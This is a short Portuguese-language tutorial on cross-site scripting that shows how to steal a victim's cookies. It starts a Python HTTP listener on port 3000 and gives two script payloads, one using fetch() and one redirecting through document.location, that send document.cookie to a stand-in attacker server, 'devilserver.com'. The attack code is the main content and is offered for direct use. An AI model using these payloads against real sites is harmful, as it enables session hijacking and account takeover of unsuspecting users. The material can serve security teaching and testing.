Dependendo de como a aplicação for construída, ataques de XSS podem ser capazes de fazer requisições em nome de outro usuário contendo dados sensíveis. Costuma depender de quais dados o ``java script`` terá acesso.

Podemos fazer uma requisição com com informações do usuário, para o nosso servidor.

Primeiro criamos um servidor na nossa máquina. Nesse caso na porta 3000.
```sh
python3 -m SimpleHTTPServer 3000
```

Já na nossa payload, devemos colocar qual a função que queremos que JavaScript execute no computador das vítimas.

Pomos fazer uma requisição enviando o cookie de acesso para o nosso servidor python.
```html
<script>
fetch("http://devilserver.com:3000/?cookie="+document.cookie)
</script>
```

Lembrando que podemos informar qualquer informação que o JavaScript tenha acesso.

Caso o navegador do usuário não tenha suporte ao `fetch` podemos usar do redirecionamento para o site que queremos, que seria o mesmo que forçar a vítima a fazer um `GET`.

```html
<script>
	document.location = "http://devilserver.com:3000/?cookie="+document.cookie
</script>
```